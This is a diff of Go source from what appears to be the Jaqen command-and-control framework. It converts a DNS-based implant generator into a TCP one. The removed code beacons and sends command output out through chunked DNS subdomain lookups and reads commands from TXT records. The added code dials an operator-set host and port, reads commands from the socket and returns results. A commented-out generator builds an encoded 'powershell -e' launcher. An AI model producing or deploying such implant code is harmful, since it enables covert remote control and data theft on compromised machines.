@@ -1,97 +1,101 @@
-package dnsListener
+package tcpListener
 
 import (
 	"bytes"
-	"encoding/base64"
 	"fmt"
 	"io/ioutil"
 	"os"
 	"path"
-	"strconv"
 	"text/template"
 
 	"github.com/c-sto/Jaqen/libJaqen/server"
 	"github.com/gobuffalo/packr"
-	"golang.org/x/text/encoding/unicode"
 )
 
-func (d JaqenDNSListener) genGolangAgent() []byte {
+func (d JaqenTCPListener) genGolangAgent() []byte {
 	//Thanks to moloch-- and the rosie project for figuring out how to do the generation stuff mostly good https://github.com/moloch--/rosie
-	dom, _ := d.GetOption("domain")
+	host, _ := d.GetOption("ip")
+	port, _ := d.GetOption("port")
 	checkinTime, _ := d.GetOption("checkintime")
 	execTime, _ := d.GetOption("exectime")
 
 	codeStruct := server.AgentCode{
 		CmdExecTimeout: execTime,
 		CheckinMaxTime: checkinTime,
-		Imports: `*/	
-		"encoding/hex"
-		"os"
-		"fmt"
+		Imports: `*/
+		"bufio"
 		"net"
+		"os"
 		/*`,
 		GlobalVars: `
-		*/const payloadSizeMax = 62
+		*/ //global
+type tcpObjs struct {
+	inChan chan string //data to send
+	//outChan    chan tcpResponse //data received
+	reader     *bufio.Reader
+	writer     *bufio.Writer
+	conn       net.Conn
+	connection *agent
+	id         string
+	Running    bool
+	commands   chan string
+}
+
+var tO tcpObjs
+
+func getCommandFromSocket() {
+	for {
+		if !tO.Running {
+			randyboi := rand.Intn(1000) //1 seconds variance
+			time.Sleep(time.Duration(randyboi) * time.Millisecond)
+			continue
+		}
+		text, _ := tO.reader.ReadString('\n')
+		tO.commands <- text
+	}
+}
+
 /*
 `,
-		Checkin: `*/	
-		net.LookupIP(a.uid + "." + a.settings.Get("c2Domain"))
-		/*`,
-		Init: `*/	
-		a.settings.Set("c2Domain", "` + dom + `")
-		/*`,
-		GetCommand: `*/
-		cmdID := RandStringRunes(4)
-		lookupAddr := fmt.Sprintf("%s.%s.%s", cmdID, a.uid, a.settings.Get("c2Domain"))
-		command, err := net.LookupTXT(lookupAddr)
-		if err != nil {
-			panic(err)
+		Checkin: `*/
+		//checkin
+		//check if the tcp socket still connected
+		if !tO.Running {
+			// if not connected, try to connect again
+			c, err := net.Dial("tcp", a.settings.Get("host")+":"+a.settings.Get("port"))
+			if err == nil {
+
+				tO.conn = c
+				tO.reader = bufio.NewReader(tO.conn)
+				tO.Running = true
+			} else {
+				os.Exit(1)
+			}
 		}
-	
-		a.cmd, a.cmdID = command[0], cmdID
-	
-		if a.cmd != "NoCMD" {
+		/*`,
+		Init: `*/ //init
+		//set port and host
+		tO = tcpObjs{
+			Running:  false,
+			inChan:   make(chan string),
+			commands: make(chan string, 5),
+			//outChan: make(chan string),
+		}
+		a.settings.Set("port", "` + port + `")
+		a.settings.Set("host", "` + host + `")
+		go getCommandFromSocket()
+		/*`,
+		GetCommand: `*/ //GetCommand
+		select {
+		case a.cmd = <-tO.commands:
 			return true
-		}
-		if a.cmd == "exit"{
-			os.Exit(0)
+		default:
+			return false
 		}
 		/*`,
 		ExecCommand: `*//*`,
 		SendResponse: `*/	
-		encodedResult := hex.EncodeToString(b)
-		blocks := len(encodedResult) / payloadSizeMax
-		leftover := len(encodedResult) % payloadSizeMax
-		if leftover > 0 {
-			blocks++
-		}
-	
-		for x := 1; x <= blocks; x++ {
-			minVal := (x - 1) * payloadSizeMax
-			maxVal := x * payloadSizeMax
-			if maxVal > len(encodedResult) {
-				maxVal = len(encodedResult)
-			}
-			payload := encodedResult[minVal:maxVal]
-			chunknumber := x
-			maxChunks := blocks
-			lookupaddr := fmt.Sprintf("%s.%d.%d.%s.%s.%s", payload, chunknumber, maxChunks, a.cmdID, a.uid, a.GetSetting("c2Domain"))
-	
-			go func() {
-				for {
-					x, err := net.LookupIP(lookupaddr)
-					if err != nil {
-						continue
-					}
-					z := net.ParseIP("127.0.0.1")
-					if z.Equal(x[0]) {
-						break
-					}
-					time.Sleep(time.Duration(3)*time.Second) //arbitrary sleep retry value (1 was too low, got repeated responses)
-				}
-			}()
-	
-		}
+		tO.conn.Write(b)
 		/*`,
 	}
 
@@ -182,12 +186,13 @@ func (d JaqenDNSListener) genGolangAgent() []byte {
 	return []byte{} //buf.Bytes()
 }
 
+/*
 type powershellagent struct {
 	Domain string
 	Split  int
 }
 
-func (d JaqenDNSListener) genBashAgent() string {
+func (d JaqenTCPListener) genBashAgent() string {
 	dom, _ := d.GetOption("domain")
 
 	spl := 60
@@ -204,13 +209,13 @@ func (d JaqenDNSListener) genBashAgent() string {
 		Domain: dom,
 		Split:  spl,
 	}
-	boxs, err := packr.NewBox("./").MustString("bashdnsagent.sh")
+	boxs, err := packr.NewBox("./").MustString("bashtcpagent.sh")
 
 	if err != nil {
 		fmt.Println(err)
 		return ""
 	}
-	code, err := template.New("bashdnsagent").Parse(boxs)
+	code, err := template.New("bashtcpagent").Parse(boxs)
 	if err != nil {
 		fmt.Println(err)
 		return ""
@@ -224,7 +229,7 @@ func (d JaqenDNSListener) genBashAgent() string {
 	return buf.String()
 }
 
-func (d JaqenDNSListener) genPowershellAgent() string {
+func (d JaqenTCPListener) genPowershellAgent() string {
 	dom, _ := d.GetOption("domain")
 
 	spl := 60
@@ -241,13 +246,13 @@ func (d JaqenDNSListener) genPowershellAgent() string {
 		Domain: dom,
 		Split:  spl,
 	}
-	boxs, err := packr.NewBox("./").MustString("dnsagent.ps1")
+	boxs, err := packr.NewBox("./").MustString("tcpagent.ps1")
 
 	if err != nil {
 		fmt.Println(err)
 		return ""
 	}
-	code, err := template.New("dnsagent").Parse(boxs)
+	code, err := template.New("tcpagent").Parse(boxs)
 	if err != nil {
 		fmt.Println(err)
 		return ""
@@ -261,4 +266,4 @@ func (d JaqenDNSListener) genPowershellAgent() string {
 	x, _ := unicode.UTF16(unicode.LittleEndian, unicode.IgnoreBOM).NewEncoder().String(buf.String())
 	return "powershell -e " + base64.StdEncoding.EncodeToString([]byte(x))
 	//return x //buf.String()
-}
+}*/
